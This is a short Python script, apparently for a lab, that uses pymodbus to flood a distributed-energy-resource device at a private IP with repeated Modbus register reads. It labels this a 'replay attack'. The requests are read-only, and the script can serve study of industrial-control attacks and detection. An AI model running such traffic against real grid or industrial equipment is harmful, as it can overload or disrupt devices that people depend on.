from pymodbus.client import ModbusTcpClient
import time

DER_IP = "192.168.50.20"
PORT = 502

client = ModbusTcpClient(DER_IP, port=PORT)

if not client.connect():
    print("FAILED to connect to DER at", DER_IP, "port", PORT)
    raise SystemExit

print("Connected to DER:", DER_IP)
print("Starting continuous REPLAY traffic... Press Ctrl+C to stop.")

try:
    while True:
        # Replay SAME request repeatedly (replay behavior)
        rr = client.read_holding_registers(address=0, count=4, slave=1)

        if rr.isError():
            print("Replay read error:", rr)
        else:
            print("Replayed request → registers:", rr.registers)

        # very small delay to simulate replay burst
        time.sleep(0.05)

except KeyboardInterrupt:
    print("\nStopped replay attack.")

finally:
    client.close()